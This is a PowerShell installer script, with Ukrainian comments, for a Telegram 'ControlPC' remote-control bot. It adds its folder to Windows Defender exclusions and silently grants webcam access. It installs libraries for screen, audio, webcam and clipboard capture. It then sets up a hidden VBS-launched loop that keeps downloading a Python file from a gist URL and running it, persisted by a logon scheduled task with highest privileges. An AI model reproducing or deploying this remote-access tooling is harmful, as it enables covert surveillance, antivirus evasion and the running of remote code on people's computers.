# --- 0. ПЕРЕВІРКА НА АДМІНІСТРАТОРА ---
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Warning "УВАГА! Будь ласка, запустіть PowerShell ВІД ІМЕНІ АДМІНІСТРАТОРА, а потім вставте команду знову!"
    Break
}

$botDir = "$env:LOCALAPPDATA\ControlPC"
$botFile = "$botDir\ControlPC.py"
$batFile = "$botDir\start_internal.bat"
$vbsFile = "$botDir\start_hidden.vbs"
$tokenFile = "$botDir\token.txt"

# ⚠️ ЗАМІНИ ЦЕ ПОСИЛАННЯ НА СВОЄ ПРЯМЕ ПОСИЛАННЯ НА CONTROLPC.PY (З REPOS/GIST)
$botUrl = "https://gist.githubusercontent.com/bsatird/4ac4b17c4bb451308e9696875a5d7acc/raw/ControlPC.py"

Write-Host "`n--- ПОЧАТОК АВТОМАТИЧНОГО ВСТАНОВЛЕННЯ БОТА ---" -ForegroundColor Magenta

if (!(Test-Path $botDir)) { New-Item -Path $botDir -ItemType Directory | Out-Null }

# --- 1. ЗАПИТ ТОКЕНА ПРЯМО В КОНСОЛІ ---
if (!(Test-Path $tokenFile)) {
    Write-Host "======================================" -ForegroundColor Yellow
    Write-Host "НАЛАШТУВАННЯ НОВОГО НОУТБУКА" -ForegroundColor Cyan
    $userToken = Read-Host "🤖 Встав ТОКЕН бота для ЦЬОГО ноутбука (і натисни Enter)"
    
    # Зберігаємо без зайвих пробілів
    $userToken.Trim() | Out-File -FilePath $tokenFile -Encoding utf8
    Write-Host "[*] Токен успішно збережено локально!" -ForegroundColor Green
    Write-Host "======================================`n" -ForegroundColor Yellow
}

Write-Host "[*] Додаємо бота у виключення Defender..." -ForegroundColor Cyan
Add-MpPreference -ExclusionPath $botDir

Write-Host "[*] Розблоковуємо доступ до веб-камери..." -ForegroundColor Cyan
$CamReg = "HKCU:\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam\NonPackaged"
if (!(Test-Path $CamReg)) { New-Item -Path $CamReg -Force | Out-Null }
Set-ItemProperty -Path $CamReg -Name "Value" -Value "Allow"

Write-Host "[*] Перевірка та встановлення бібліотек Python (зачекайте)..." -ForegroundColor Cyan
$packages = "pyTelegramBotAPI", "opencv-python", "pyautogui", "psutil", "pyttsx3", "sounddevice", "scipy", "pyperclip"
foreach ($pkg in $packages) {
    python -m pip install $pkg --quiet
}

Write-Host "[*] Створення скриптів прихованого запуску..." -ForegroundColor Cyan
$batContent = @"
@echo off
:update_loop
powershell -Command "Invoke-WebRequest -Uri '$botUrl' -OutFile '$botFile' -ErrorAction SilentlyContinue"
if not exist "$botFile" ( timeout /t 5 & goto update_loop )
python "$botFile" 2>> "$botDir\bot_errors.txt"
timeout /t 10
goto update_loop
"@
Set-Content -Path $batFile -Value $batContent

$vbsContent = 'Set WshShell = CreateObject("WScript.Shell")' + "`n" + "WshShell.Run `"$batFile`", 0, False"
$vbsContent | Out-File -FilePath $vbsFile -Encoding ascii

Write-Host "[*] Налаштування автозапуску в систему..." -ForegroundColor Cyan
schtasks /delete /tn "ControlPC_Bot" /f 2>$null
schtasks /create /tn "ControlPC_Bot" /tr "wscript.exe `"$vbsFile`"" /sc onlogon /rl highest /f

Write-Host "[*] Запуск бота у фоновому режимі..." -ForegroundColor Yellow
Start-Process "wscript.exe" -ArgumentList "`"$vbsFile`""

Write-Host "--- ВСЕ ГОТОВО! БОТ ПОВНІСТЮ НАЛАШТОВАНИЙ І ЗАПУЩЕНИЙ! ---`n" -ForegroundColor Green